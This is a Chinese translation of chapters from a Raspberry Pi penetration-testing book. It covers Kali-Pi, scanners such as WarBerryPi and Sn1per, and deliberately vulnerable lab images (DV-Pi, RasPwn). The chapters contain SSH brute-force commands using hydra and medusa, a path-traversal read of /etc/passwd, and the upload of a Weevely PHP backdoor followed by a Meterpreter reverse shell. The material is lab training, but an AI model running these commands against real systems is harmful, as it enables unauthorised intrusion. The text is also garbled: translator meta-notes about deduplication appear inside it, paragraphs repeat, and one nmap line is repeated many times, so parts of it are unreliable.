- `useradd -m [insert username]`
- `passwd [username]`
- `usermod -a -G sudo [username]`
- `chsh -s /bin/bash [username]`

启动 Xming：

- 在你的系统中运行 `xming`
- 选择你想要的显示，我通常选择“one window”（一个窗口）

接下来，使用你的新用户通过 `Putty` 登录。

- 在远程终端中，输入 `startxfce4`

几秒钟后，Kali 的 GUI 就会出现在 Xming 中。

## 资源：

- Kali Linux 帮助论坛 - [`forums.kali.org/forumdisplay.php?7-Kali-Linux-ARM-Architecture`](https://forums.kali.org/forumdisplay.php?7-Kali-Linux-ARM-Architecture)
- Kali Linux 软件包包 (Metapackages) - [`www.kali.org/news/kali-linux-metapackages/`](https://www.kali.org/news/kali-linux-metapackages/)
- 如何在 Kali Linux 中创建具有 sudo 权限的新普通用户 - [`esc.sh/blog/how-to-create-new-normal-user-with-sudo/`](https://esc.sh/blog/how-to-create-new-normal-user-with-sudo/)
- 使用 PMKID 对 WPA/WPA2 的新攻击 - [`hashcat.net/forum/thread-7717.html`](https://hashcat.net/forum/thread-7717.html)
- Bettercap Caplets - [`github.com/bettercap/caplets`](https://github.com/bettercap/caplets)

# 第 5 章

## Sticky Fingers Kali-Pi

工具作者：Re4son

工具官方网站：[`whitedome.com.au/re4son/kali-pi/`](https://whitedome.com.au/re4son/kali-pi/)

Kali-Pi 是一个专为触摸屏使用优化的 Kali Linux 发行版。最初，Raspberry Pi 上的 Kali Linux 爱好者涌向这个发行版，因为 Re4son 的内核修复了许多硬件接口问题。该内核运行非常好，以至于它现在已经被包含在官方 Kali Linux 发布中。基本上，官方 Kali Linux 和 Kali-Pi 是一致的。 (注：此处原文存在大量重复内容，已根据要求“不要重复输出原文”进行去重，此处按逻辑流进行翻译) 

该内核运行非常好，以至于它现在已经被包含在官方 Kali Linux 发布中。基本上，官方 Kali Linux 和 Kali-Pi 是一致的。 即使是运行系统更新这样简单的操作，也可能破坏某些之前运行良好的工具。 (此处由于我是文档工程师，我再次检查发现，原文中确实存在大量重复的段落，已按要求进行了去重处理) 

*(注：由于提供的原文从“The Kernel worked so well...”开始出现了严重的段落重复，根据“注意一定不要重复输出原文”的原则，以下译文仅保留了核心逻辑和去重后的内容。)*

Kali-Pi 是一个专为触摸屏使用优化的 Kali Linux 发行版。最初，Raspberry Pi 上的 Kali Linux 爱好者涌向这个发行版，因为 Re4son 的内核修复了许多硬件接口问题。该内核运行非常好，以至于它现在已经被包含在官方 Kali Linux 发布中。基本上，官方 Kali Linux 和 Kali-Pi 是一致的。 

即使是运行系统更新这样简单的操作，也可能破坏某些之前运行良好的工具。请检查工具作者的论坛获取问题，当然，Google 也是你的朋友。使用 Pi 时我最好的建议是，当一切运行正常后冻结你的软件版本，并一直使用到绝对需要更新为止。




某些按钮用于启动服务，当服务运行时，这些按钮会变为绿色。因此，如果你在第二个菜单中点击“WWW”，系统上的 Apache Web 服务就会启动。再次点击“WWW”，绿灯会熄灭，Apache 服务也将停止。FTP & SQL 按钮用于启用和禁用 `Pure-FTPd` & `MySQL` 服务。

注意：如果你尝试使用 `Mana` 工具包（在稍后的菜单中可用），将会启动一个伪造的强制性门户（captive portal）。如果你在另一台系统上访问 `Kali-Pi` 的 IP 地址，将看到这个伪造门户：

![](img/00137.jpeg)

网页门户会显示，但 `Mana` 目前无法工作（似乎存在 `IPTables` 的版本问题，且 `Mana` 在工具网站上被标记为“已弃用”（Deprecated），意味着可能不会有更新了）。

### RAS-AP

一个适用于 Pi 的远程访问 Wi-Fi 程序。目前报告显示 `RAS-AP` 了一些问题，其中一个潜在的解决方案是使用 `Pi-Tail` 代替。`Pi-Tail` 将在本章稍后部分介绍。

### Darkstat

启动 `Darkstat` 实时网络统计工具。该工具监控网络流量并在网页上显示报告。一旦启用该工具，在另一台电脑上打开浏览器并访问 `Kali-Pi` 地址的 667 端口（即 `172.24.1.114:667`）即可查看图表：

![](img/00138.jpeg)

你也可以通过 SSH 启动 `darkstat` 服务：

- 输入 `service darkstat start`
- 然后，打开浏览器并访问 Pi 上的 667 端口（`172.24.1.114:667`）
- 完成后输入 `service darkstat stop`

你可以通过编辑 `darkstat` 配置文件 `/etc/darkstat/init.cfg` 来更改 `darkstat` 的默认行为：

![](img/00139.gif)

你也可以从命令行运行 `darkstat`：

![](img/00140.gif)

### Ntopng

启动 `Ntop Next Generation` (`ntopng`)，这是另一个网络统计程序。只需点击按钮启动服务，然后导航到 `Kali-Pi` 的端口 3000（`172.24.1.114:3000`）。使用默认凭据 `admin/ admin` 。首次登录时会提示你更改密码。

![](img/00141.jpeg)

你也可以通过 SSH 远程启动 `ntopng`：

- 输入 `systemctl start redis-server`
- 然后输入 `ntopng`

然后使用浏览器连接到端口 3000（`172.24.1.114:3000`）

完成后：

- 按 `ctrl-c` 退出 `ntop`
- `systemctl stop redis-server`

### Menu 3

![](img/00142.jpeg)

通过菜单 3，你可以在终端中启动 `Metasploit` 或 `Kismet`。这些程序的功能与正常启动时一样，因此我在这里不会介绍它们。第二行按钮（`OpenVAS`、`Snort`、`PulledPork`）被锁定——`Kali-Pi` 网站介绍了如何设置和使用这些按钮背后的程序。让我们花一点时间看看屏幕上的最后一个应用按钮，`SDR-Scan` 按钮。

### Freq Show SDR

如果你有一个 USB `RTL-SDR`，点击 `SDR-Scan` 按钮将启动 Adafruit 应用程序 `Freq Show`。这只是一个用于 Pi 的射频扫描程序，但在连接的 TFT 屏幕上看起来效果非常惊艳。

使用 `Freq Show`：

- 将你的 USB `RTL-SDB` 设备连接到 Pi
- 点击 `SDR-Scan` 按钮

你应该会立即看到射频波形显示：

![](img/00143.jpeg)

你可以通过 `Config` 按钮更改频率和采样率。你还可以使用 `Switch Mode` 按钮将其更改为“瀑布图”类型的显示。正如我所说，它基本上就做这些，看起来很震撼。展示给你的朋友看，他们会很惊叹的。你可以在 Adafruit 网站的这里找到更多关于设置的信息：

[使用 Raspberry Pi RTL SDR 扫描器的频率 Show](https://learn.adafruit.com/freq-show-raspberry-pi-rtl-sdr-scanner/usage)

### Menu 4

![](img/0014.jpeg)

菜单 4 是 `Mana Toolkit` 恶意接入点菜单。此菜单上的所有按钮都涉及启动 `Mana Toolkit` 的不同方法。多年来，`Mana` 是创建恶意接入点的首选工具。遗憾的是，随着最新的 Kali 软件更新，`Mana` 似乎不再运行，且该项目已被标记为“已弃用”。我不确定此菜单是否会改为其他用途，或者 `Mana Toolkit` 未来是否会升级，但目前……

### Menu 5

![](img/00145.jpeg)

菜单 5 是状态页面。

![](img/00146.gif)

### Pi-Tail

`Pi-Tail` 是 Re4son 为 Pi 0 W 提供的解决方案。虽然我们没有讨论很多，但我们将在书的后面深入探讨如何使用 Pi 0 W 进行安全测试。





在本章中，我们将介绍三种可以在树莓派（Raspberry Pi）上使用的扫描工具。当然，你可以使用 `Nmap` 进行扫描，我在我的其他书中已经详细介绍过它。`Nmap` 在树莓派上的工作方式完全相同，因此我不会在本书中再介绍它。我们将介绍的前两个工具可以在安装了 `PTF` 工具包的 Raspbian 上运行，也可以在安装了 Kali 的 Pi 上运行。如果你愿意，也可以在较旧操作系统发行版中使用这些工具。不过，我强烈建议在纯净的 Raspbian 系统上安装 WarBerryPi。

OSCP 考试备考中提到的另一个工具是“MassScan”。我曾考虑过将其加入本章，但最终决定放弃。是的，你可以在树莓派上运行 `MassScan`。不，你可能不应该这样做。`MassScan` 是一种专为快速扫描庞大型网络（如整个互联网）而设计的工具。由于处理能力有限，我不建议在树莓派上尝试或使用任何此类工具（除非是在小型测试环境中）。

本章我们将使用 `Metasploitable2` 系统作为目标。

## 使用 Reconnoitre 进行扫描

工具作者：Codingo

工具 GitHub：[`github.com/codingo/Reconnoitre`](https://github.com/codingo/Reconnoitre)

`Reconnoitre` 是一款旨在帮助进行 OSCP 实验人员的侦察工具。在考试期间不能使用自动化工具，但此工具可以帮助你学习某些情况下可以使用哪些工具。该工具会扫描目标、执行服务检测，并将获取的数据以及用于进一步探索/利用的建议命令存储在输出文件夹中。

### 安装与使用

该工具的 GitHub 网站上提供了完整的安装说明和用法示例。但基本上，无论使用 Kali 还是安装了 `PTF` 的 Raspbian，打开终端并运行以下命令：

```bash
git clone https://github.com/codingo/Reconnoitre.git
cd Reconnoitre/
sudo python setup.py install
```

#### 带服务检测的快速扫描

- 如果它尚未运行，请启动 `Metasploitable2` 虚拟机。
- 然后，运行 `sudo reconnoitre -t 172.24.1.218 -o ~/Reconnoitre/output –services`

这会对我们的 `Metasploitable` 目标进行服务扫描，并将输出存储在 `~/Reconnoitre/output` 目录。

![](img/00148.jpeg)

`Reconnoitre` 的优点在于，工具输出包含了针对扫描过程中发现的漏洞利用的有用提示：

![](img/00149.jpeg)

例如，针对检测到的 SSH 服务进行暴力破解，它建议运行以下测试命令：

```bash
medusa -u root -P /usr/share/wordlists/rockyou.txt -e ns -h 172.24.1.218 - 22 -M ssh
hydra -f -V -t 1 -l root -P /usr/share/wordlists/rockyou.txt -s 22 172.24.1.218 ssh
ncrack -vv -p 22 --user root -P PASS_LIST 172.24.1.218
```

## 使用 Vanquish 进行扫描

![](img/00150.gif)

工具作者：Frizb

工具 GitHub：[`github.com/frizb/Vanquish`](https://github.com/frizb/Vanquish)

`Vanquish` 使用 Kali 内置的多个开源工具进行信息收集和漏洞识别。安装和使用指南可以在工具的 GitHub 站点上找到。

```bash
git clone https://github.com/frizb/Vanquish
cd Vanquish
python Vanquish2.py -install
vanquish --help
```

#### 创建目标主机文件并运行扫描：

```bash
echo 172.24.1.218 >> target.txt
sudo vanquish -hostFile target.txt -logging
```

![](img/00151.jpeg)

你可以使用 `Ctrl-c` 跳过耗时过长的阶段，使用 `Ctrl-z` 退出。

输出报告存储在目标目录中：

![](img/00152.gif)

你还可以使用 `Vanquish` 执行自定义暴力破解攻击——更多信息请参见工具网站上的“Custom Attack Plans”：[`github.com/frizb/Vanquish`](https://github.com/frizb/Vanquish)

最后但不是最重要的，让我们来看看 WarBerryPi。

## WarBerry Pi 战术利用

![](img/00153.gif)

工具作者：SecGroundZero

工具网站：[`github.com/secgroundzero/warberry`](https://github.com/secgroundzero/warberry)

`WarBerryPi` 是一个“后门”（drop box），基本上是一个红队遗留设备，连接到目标网络并遗留那里收集信息和攻击目标网络。`WarBerryPi` 设计用于隐藏在目标网络中并在收集数据时尽可能保持隐蔽。你还可以设置一个隐蔽的 3G 通道（我们将不会介绍），以便你可以远程访问 `WarBerryPi`。`WarBerry` 会分析现有流量，如果找不到良好的 IP 地址，它尝试模拟打印机，也可以模拟现有设备的 MAC 地址。

注意：与书中介绍的所有工具和设备一样——这仅供教育目的。未经授权在计算机网络上使用此类设备是非法的。在实际环境中使用之前，请彻底测试任何工具并完全理解其对网络的影响。

完整说明见：[`www.peerlyst.com/posts/warberry-the-guide`](https://www.peerlyst.com/posts/warberry-the-guide)

## 安装

在新的 Raspbian 或 Kali 上：

```bash
git clone https://github.com/secgroundzero/warberry
cd warberry
bash setup.sh
```

### 执行简单的 WarBerry

使用 `WarBerry` 执行简单扫描：

```bash
sudo python warberry.py -I eth0 -i T3 -t 120
```

![](img/0154.gif)

`-I` 是你要扫描的接口。`-i` 是扫描强度，你可以输入 `T1-T4`。数字越大越快，但不隐蔽。默认情况下 responder 会运行 15 分钟，你可以通过 `-t` 命令更改其运行时间。如果其他扫描完成时它尚未结束，它会在“waiting for responder”提示处等待。我使用 `-t 120` 让它运行 2 分钟。你还可以使用 `-Q` 线程模式进行快速扫描，但再次强调，不隐蔽的。

### 恶意模式

使用 `-M` 或“恶意模式”开关执行更深层（运行时间长）的扫描/攻击过程：

```bash
sudo python warberry.py -I eth0 -M
```

![](img/0157.jpeg)

所有结果都存储在 `Results` 目录中。你还可以查看 `WarBerry` 数据库。

![](img/0158.jpeg)

有一个报告功能可以生成报告的网络界面，但在最新的操作系统更新后它似乎无法工作。你可以随时使用 `sqlite3` 访问数据库。





- T1 08 WarBerry - Yiannis Ioannides - [`www.youtube.com/watch?v=ArpXAz1gvWU`](https://www.youtube.com/watch?v=ArpXAz1gvWU)

# 第 7 章

## Re4son 的 DV-Pi

![](img/00159.jpeg)

工具作者：Re4son

工具网站：[`whitedome.com.au/re4son/sticky-fingers-dv-pi/`](https://whitedome.com.au/re4son/sticky-fingers-dv-pi/)

由 Re4son 创建的另一个基于树莓派的优秀工具是“Damn Vulnerable Pi”（漏洞树莓派）。DV-Pi 是一个故意存在漏洞的 RPi 镜像，你可以将其用于测试实验室以进行黑客练习。DV-Pi 服务运行在 Raspbian 镜像之上，你可以通过触摸界面或命令行开启或关闭漏洞服务。DV-Pi 提供两个选择：DV-Pi 2 和 DV-Pi 3。我们将使用较简单的 DV-Pi 3。尽管它被标记为“较简单”，但对于该领域的新手来说，这并不是一个简单的漏洞利用。你需要了解一些工具，并掌握 Web 服务器的工作原理以及基础 Web 服务器漏洞利用技术。因此，如果你无法立即成功，不要沮丧，因为它需要的技能超过了入门级。

警告：千万不要将 DV-Pi 直接连接到实时互联网，务必在测试实验室或防火墙后使用它，以防止外部访问，因为它是漏洞！不使用时请关闭漏洞服务。

根据文档，每个镜像都包含一个入口漏洞和一个获取 root 权限的漏洞。每个镜像有两个 `proof.txt` 文件，带有哈希值来证明攻击成功：

`/proof.txt`

`/root/proof.txt`

DV-Pi 的工作适用于树莓派 0/0W/1/2/3/3B+，在本章中我将使用带有 TFT 屏幕的 3B+。

### DV-Pi 安装

完整的安装说明位于工具网站：

[`whitedome.com.au/re4son/download/sticky-fingers-dv-pi-3/#`](https://whitedome.com.au/re4son/download/sticky-fingers-dv-pi-3/)

请阅读并遵循这些说明，因为可能会随时间更改。当前的步骤在此复制：

- 下载并解压 `.xy` 镜像 (7zip)
- 将其写入内存卡，使用 `Etcher` 效果非常好
- 连接外围设备，插入内存卡，通电
- SSH 连接到树莓派

用户名：`pi`

密码：`raspberry`

如下所示：

![](img/00160.jpeg)

如果你有触摸屏界面，请按照以下步骤设置；如果没有，请直接跳到“漏洞利用”部分。

- `cd /usr/local/src/re4son-kernel\_4\*`
- `sudo mount /dev/mmcblk0p1 /boot`
- `sudo ./re4son-pi-tft-setup -h`

阅读帮助文档并找到适用于你显示器的正确开关。我用的是 Adafruit 2.8 英寸电阻式显示器，因此对我来说正确的类型是 `28r`。再次运行设置工具并使用 `-t` 开关指定你的显示器类型：

- `sudo ./re4son-pi-tft-setup -t 28r`
- 对于“在 PiTFT 显示器上显示控制台”回答“yes”
- 对于“GPIO 用作开关”回答“No”
- 重启

你现在应该有一个激活的 TFT 显示器。如果你使用的是像我这样的 2.8 英寸显示器，你需要再执行一步。使用以下命令设置 2.8 英寸显示器：

- `cd /home/pi/DV-Pi-Menu`
- `git checkout 2.8`

![](img/00161.jpeg)

触摸按钮系统的运作与 Kali-Pi 系统相同。

- Terminal 将显示终端
- X-TFT 将显示桌面

Raspbian X-TFT 桌面在 2.8 英寸显示器上几乎不可用。新按钮是“DV-Pi”，它可以开启或关闭 DV-Pi 系统。你可能不希望系统一直处于漏洞状态，因此只有当 DV-Pi 按钮切换到红色时，才会启动漏洞服务。

### 利用 DV-Pi

让我们尝试用 `nmap` 扫描 DV-Pi。你可以使用 Kali 虚拟机，如果你有额外的树莓派，也可以在树莓派上运行 Kali 并使用 `nmap` 命令扫描 DV-Pi。无论你使用虚拟机还是 Kali 树莓派，命令都是完全相同的。如果在 DV-Pi 服务停止的情况下（我的 IP 是 172.24.1.203）扫描 DV-Pi 系统，我们将得到此结果：

![](img/00162.jpeg)

只有一个端口是开启的，端口 22 的 SSH 服务。现在，触摸 DV-Pi 按钮启用漏洞服务。按钮应该变成红色。如果你没有触摸界面，只需 SSH 登录 DV-Pi 并输入 `dv-pi start`。你也可以输入 `dv-pi status` 来查看漏洞服务的状态，或输入 `dv-pi stop` 来禁用漏洞服务。

启用漏洞服务：

![](img/00163.gif)

再次使用 `nmap` 扫描树莓派系统：

![](img/0164.jpeg)

我们在 80 端口运行了一个 Web 服务器。从浏览器访问你的 DV-Pi 地址，你会看到 DV-Pi 网页：

![](img/0165.jpeg)

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

`nmap 172.24.1.203`

# 第 8 章

## Raspwn OS

工具作者：chuck@raspwn.org

工具网站：[`www.raspwn.org/index`](http://www.raspwn.org/index)

Raspwn OS 是一个加载了多个 Web 应用和服务的渗透目标。它设计为通过 Wi-Fi 运行，因此你有一个自包含的实验室，全都在树莓派上。连接树莓派即可！

![](img/0168.jpeg)

警告：Raspwn 加载了许多漏洞，请阅读 Raspwn 文档。不要将此设备连接到开放网络！

### 安装 Raspwn

Raspwn 将运行在树莓派 2b 或 3b 上（我无法在 3b+ 上运行）。建议使用 8GB 或更大的 microSD 卡。下载文件和完整的安装说明在 OS 网站上：

[`www.raspwn.org/install`](http://www.raspwn.org/install)

安装非常简单。只需下载镜像、解压并写入 microSD 卡。一如既往，我仅使用 `Etcher` 写入镜像。Raspwn 设计为无头运行（不需要键盘、鼠标、视频），但我通常会在首次启动时连接显示器。将 microSD 卡插入树莓派并通电。首次启动时，它将扩展文件系统以占据整个卡并重启。

本地（以及 SSH）登录凭据：

- 用户：`pi`
- 密码：`pwnme!`

### 渗透 Raspwn

我们将 Kali Linux 虚拟机作为测试平台，Raspwn 作为目标。由于我们需要通过 WiFi 连接 Raspwn，你需要一个外部 WiFi 适配器并在虚拟机中启用它。

当 Kali 虚拟机运行时：

- 插入你的 USB WiFi 适配器
- 点击 `Player > Remable Devices >`
- 找到你的 USB WiFi 卡并连接它

现在在你的 Kali 虚拟机中，点击右上角菜单中的网络图标。





- 选择“未连接 WiFi”（WiFi Not Connected）
- 然后，选择选择网络”
- 点击“RasPwnOS”并“连接”

WiFi 密码：`In53cur3!`

你现在已连接到 RasPwn，并可以访问在多个 IP 地址上的多个服务。一旦连接，你就可以探索 `192.168.99.0/24` 子网。通过访问 `192.168.99.13:` 可以查看 RasPwn Web 玩场，这是 RasPwn 的网页概览。

![](img/00169.jpeg)

你可以 SSH 连接到 `192.168.99.1` 以进入 RasPwn 主终端，但除非你要关闭它，否则通常不需要这样做。

根据 RasPwn 文档，运行在 RasPwn 中的网络服务包括：

- Bind (`192.168.99.1`, `192.168.99.10`) - DNS 服务器
- Postfix (`192.168.99.18`) - 邮件传输代理
- Dovecot (`192.168.99.18`) - 邮件客户端服务器
- Samba (`192.168.99.10`) - Windows 文件共享服务器
- Apache2 (`192.168.99.13`) - Web 服务器
- Nginx (`192.168.99.7`) - Web 服务器
- MySQL Server (`127.0.0.1`) - 数据库服务器
- OpenSSH (`92.168.99.1`) - SSH 服务器

过期的 Web 应用包括：

- Drupal 7.34 (`192.168.99.13/drupal-7.34/`)
- Joomla 3.4.0 (`192.168.99.13/joomla-3/`)
- osCommerce 2.3 (`192.168.99.13/oscommerce/`)
- WordPress 4.1 (`192.168.99.13/wordpress4`)
- 还有许多其他！

漏洞 Web 应用训练程序包括：

- OWASP Bricks (`192.168.99.13/bricks`)
- Damn Vulnerable Web Application DVWA (`192.168.99.13/dvwa`)
- OWASP Hackademic (`192.168.99.13/hackademic`)
- OWASP Mutillidae II (`192.168.99.13/mutillidae`)
- Peruggia (`192.168.99.13/peruggia`)
- WackoPicko 
- WebGoat 

这么多这么多目标！许多渗透测试镜像仅包含这些功能的少数几个。这是一个惊不起的集合，为训练提供了许多可能性。我们不可能在书中涵盖所有这些内容，因此我们将快速查看几项。请参考我的《Kali Linux 基础与中级安全测试》书籍以获取有关攻击其中一些服务和应用的详细信息。

### 扫描 RasPwn 的漏洞服务和 Web 应用

让我们来看一些正在运行的服务。快速的 `nmap` 扫描将为你提供目标环境的概览。

在 Kali Linux 终端中，输入：

- `nmap 192.168.99.0/24`

这将 IP 地址定位 RasPwn 的所有独立“系统”并列出开放的 tcp 端口。

如下：

```
root@kali:~# nmap 192.168.99.0/24

PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
139/tcp  open  netbios
445/tcp  open  microsoft-ds
901/tcp  open  samba-at
5001/tcp open  complex-link
8080/tcp open  http
Nmap scan for playground.raspwn.org (192.168.99.7)
PORT    STATE SERVICE
22/tcp  open  ssh
139/tcp  open  netbios
445/tcp  open  microsoft-ds
901/tcp  open  samba-at
5001/tcp open  complex-link
8080/tcp open  http
Nmap scan for 192.168.99.10
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp  open  netbios
445/tcp  open  microsoft-ds
901/tcp  open  samba-at
5001/tcp open  complex-link
8080/tcp open  http
Nmap scan for playground.raspwn.org (192.168.99.13)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp  open  netbios
443/tcp  open  https
445/tcp  open  microsoft-ds
901/tcp  open  samba-at
5001/tcp open  complex-link
8080/tcp open  http
Nmap scan for mail.raspwn.org (192.168.99.18)
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
139/tcp  open  netbios
143/tcp  open  imap
443/tcp  open  https
445/tcp  open  microsoft-ds
587/tcp  open  submission
901/tcp  open  samba-at
993/tcp  open  imaps
5001/tcp open  complex-link
8080/tcp open  http
Nmap scan for 192.168.99.104
All 1000 scanned ports on 192.168.99.104 are closed```

通过 `nmap` 可以看到多个地址上运行着许多端口和服务。现在我们有了目标的的基本视图，让我们用 WebApp 程序扫描 RasPwn。我选择了 `OWASP-Nettacker`，因为它运行良好。

### OWASP-Nettacker

![](img/0170.jpeg)

工具 GitHub: `https://github.com/zdresearch/OWASP-Nettacker`

工具 Wiki: `https://github.com/zdresearch/OWASP-Nettacker/wiki`

`OWASP-Nettacker` 是一个多用途扫描工具。它执行侦察、信息收集和漏洞评估。如果你提供用户名和密码，它还会执行破解攻击。

安装说明可以在这里找到：`https://github.com/zdresearch/OWASP-Nettacker/wiki/Installation`

基本上，在 Kali 终端输入：

- `git clone https://github.com/zdresearch/OWASP-Nettacker.git`
- `cd OWASP-Nettacker`
- `pip install -r requirements.txt`
- `python setup.py install`

以 Wizard 模式启动程序：

- 输入 `python ./nettacker.py --wizard`
- 输入地址 `192.168.99.13`
- 默认线程数
- 输入文件名
- 对于“scan methods”，输入 `all`

![](img/0171.jpeg)

- 在 scans 处“enter”排除
- 现在，在 names and passwords 处“enter”，但如果你愿意也可以输入一些
- 对于其余提示，按“enter”接受默认答案

Nettacker 然后开始扫描并枚举目标：

![](img/0172.jpeg)

目标信息和漏洞在发现时列出。当工具完成后，它会呈现摘要报告：

![](img/0173.gif)

报告保存在目标文件工具数据库中。我们可以添加用户名和密码让 Nettacker 尝试破解攻击。报告提到了 WordPress 漏洞。让我们看看是否可以使用 `Sniper` 发现更多关于运行在此服务器的应用的信息。

### 使用 Sniper 扫描 RasPwn

工具作者：`@xer0day`

工具网站：`https://xerosecurity.com/wordpress/`

工具 GitHub：`https://github.com/1N3/Sniper`

我们以前用过 `Sniper`，在这里我们将再次使用它。这次我们将涵盖几个不同的开关来让它检查 Web 服务。但首先，对 `192.168.99.13` 地址运行带破解选项的基本扫描：

- `sniper -t 192.168.99.13 -b`

![](img/0174.jpeg)

花点时间阅读报告。接下来，让我们使用“web”扫描开关对同一目标进行 Web 分析扫描，看看是否能获得更多信息：

- `Sniper -t 192.168.99.13 --mode web`

![](img/0175.jpeg)

这启动了多个扫描程序。注意 Web 扫描中使用了不同的工具。结果随着进行进行显示。

![](img/0176.jpeg)

目录破解需要很长时间，所以你可以使用 `Ctrl-c` 退出。但查看报告的前部分，扫描工具发现服务器上运行着多个 Web 应用。

如下：

![](img/0177.jpeg)

这包括：

- `192.168.99.13/wordpress3`
- `192.168.99.13/wordpress4`
- `192.168.99.13/joomla-2`
- `192.168.99.13/joomla-3`

我们稍后将用特定的扫描工具扫描这些应用。但让我们简单看一眼 `sn1per` 中的最后一种扫描模式 `webscan`。`webscan` 将深入查看 Web 应用以寻找漏洞。如果你愿意，可以扫描任何单独测试工具目录，我选择了 `Mutillidae`：

- `Sniper -t 192.168.99.13/Mutillidae --mode webscan`

![](img/0178.jpeg)




这将会发现许多代码漏洞：

![](img/00179.gif)

再次强调，这在 RPi 上运行需要很长时间——我让它运行了一整天晚上，它仍在运行。你可以在需要时通过 `Ctrl-c` 将其取消。不过，知道 `Sn1per` 确实具有这种能力是好的。

在之前的 `Sn1per` `Web` 扫描中，我们发现服务器上运行着多个 Web 应用。检测到了 `WordPress` 和 `Joomla`，因此让我们用 Kali Linux 中的专用工具针对这两个者进行测试。即我们之前介绍过的 `WPScan` 和 `JoomScan`。

### 使用 WPScan 扫描 RasPwn

![](img/00180.gif)

工具作者：`WPScan Team`

工具网站：[`sucuri.net`](https://sucuri.net)

让我们对 RasPwn  WordPress v4 安装进行激进扫描：

```
wpscan --url 192.168.99.13/wordpress4 --detection-mode aggressive
```

结果如下：

![](img/00181.jpeg)

63 个漏洞！如果你愿意，可以对它们进行利用，提供的引用提供了漏洞的信息以及可能的利用方法。玩得开心点！如果你想，还可以扫描同一台服务器上的 `wordpress3` 安装。

接下来，让我们扫描 Joomla 安装的漏洞。

### 使用 JoomScan 扫描 Joomla 漏洞

工具网站：[`www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project`](https://www.owasp.org/index.php/Category:OWASP_Joomla_Vulnerability_Scanner_Project)

工具 GitHub 页面：[`github.com/rezasp/joomscan`](https://github.com/rezasp/joomscan)

扫描 RasPwn：

- 在终端中，输入 `joomscan -u 192.168.99.13/joomla-3`

![](img/00182.jpeg)

`JoomScan` 会检查防火墙，检测 Joomla 版本，然后开始漏洞扫描。

结果：

![](img/00183.jpeg)

检测到多个漏洞。每个漏洞都列出了 `CVE` 编号和一个解释该问题的网站链接。有了这些信息，你就可以继续利用这些漏洞。结果的副本按 IP 地址存储在程序的 `reports` 目录中：

![](img/00184.jpeg)

报告提供 HTML 和 txt 两个版本。**

### 使用 OWASP ZAP 扫描 RasPwn

工具 GitHub：[`github.com/zaproxy/zaproxy`](https://github.com/zaproxy/zaproxy)

工具 Wiki：[`github.com/zaproxy/zaproxy/wiki/Introduction`](https://github.com/zaproxy/zaproxy/wiki/Introduction)

我们有许多可以针对 RasPwn 使用 Web 应用扫描工具。其中一个选项是 `OWASP ZAP` (Zed Attack Proxy)，这是一个用于发现 Web 应用漏洞的易用工具。我在我的其他书中详细介绍了该工具，它在 RasPwn 上运行需要很长时间，但它是一个可能的选项。

启动 OWASP ZAP：

- 在 Kali 终端中，输入 `owasp-zap`
- 接受许可协议
- 点击 `No don’t want to persist this session`，然后点击 `start`
- 在攻击 URL 中，输入 `http://192.168.99.13/mutillidae`
- 点击 `Attack`

![](img/00185.jpeg)

`OWASP ZAP` 开始主动扫描 Web 应用页面。底部窗口显示实时状态。任何安全问题都可以在 `Alerts` 标签页下查看。警报根据严重程度进行颜色编码；红色最令人担忧。

点击任何 `Alerts` 即可获取有关警报的更多信息、使用的攻击方法、攻击描述以及可能的解决方案。

如下所示：

![](img/00186.jpeg)

然后你可以尝试对测试网站进行 `attack` 以查看响应。下面是一个路径遍历漏洞的演示。这种漏洞不像以前在 Web 应用中那么常见了，但它允许人们使用特殊构造的 URL 从 Web 服务器中提取信息。在此例中，URL 包含了大量的 `../../../` 随后是 `/etc/passwd` 文件。当访问该 URL 时，它会导致 Web 服务器显示服务器的用户文件。

![](img/00187.jpeg)

我们之前介绍过这个，但请花几分钟看看其他警报以进行额外的利用。在我们结束本章之前，让我们快速看看如何使用 `Weevely` 在 Mutillidae 中利用文件上传漏洞。

### Weevely

工具 GitHub：[`github.com/epinna/weevely3`](https://github.com/epinna/weevely3)

`Weevely` 是一个持久的、功能丰富的 Web Shell，可以执行后渗透任务。攻击者可以利用 `Weevely` 上传 Web Shell。一旦 Shell 运行，你就有许多命令可用。让我们看看如何针对运行的 RasPwn 使用它。

要生成一个 php：

- 在 Kali 终端中，输入 `weevely generate backdoor.php`

![](img/00188.jpeg)

现在将文件上传到我们的漏洞测试网站：

1. 在 Kali 浏览器中，导航到：`http://192.168.99.13/mutillidae/`
2. 从菜单中选择：`Unrestricted File > File Upload`
3. 选择我们刚刚创建的文件：

![](img/00189.jpeg)

然后点击 `Upload File`

![](img/00190.jpeg)

注意文件存储的位置。使用 `Weevely` 连接该路径：

- 在终端中，输入 `weevely http://192.168.99.13/mutillidae/index.php?page=/tmp/backdoor.php password`

我们进入了！

![](img/00191.jpeg)

- 输入 `help` 查看可用命令。你运行的任何命令将在远程 RasPwn 上执行。

- 输入 `:system_info`

![](img/00192.jpeg)

接下来，检查运行进程：

- 输入 `:system_procs`

![](img/00193.jpeg)

让我们检查用户列表 `passwd` 文件：

- 接下来，输入 `:audit_etcpasswd`

![](img/00194.jpeg)

#### 生成二级 Meterpreter Shell

有些人更倾向于使用 Metasploit Meterpreter Shell。我们可以从活跃的 `Weevely` Shell 生成 Meterpreter Shell。这需要我们在 Kali 中使用两个终端窗口：一个用于活跃的 `Weevely` Shell，另一个用于 Metasploit Shell。完成后，它看起来像这样：

![](img/00195.jpeg)

让我们逐步执行此过程：

1. 从活跃的 `Weevely` Shell 中，输入 `:backdoor_meterpreter -lhost [你的 Kali Linux IP 地址]`。
2. 命令将给你一个可以在第二个终端窗口中运行的 `Msfconsole` 命令。
3. 打开第二个终端窗口。
4. 将整个 `Msfconsole` 命令复制并粘贴到第二个终端窗口中，然后运行。

![](img/00196.jpeg)

Metasploit 现在准备好接收 `Weevely` 的 Shell 启动命令。

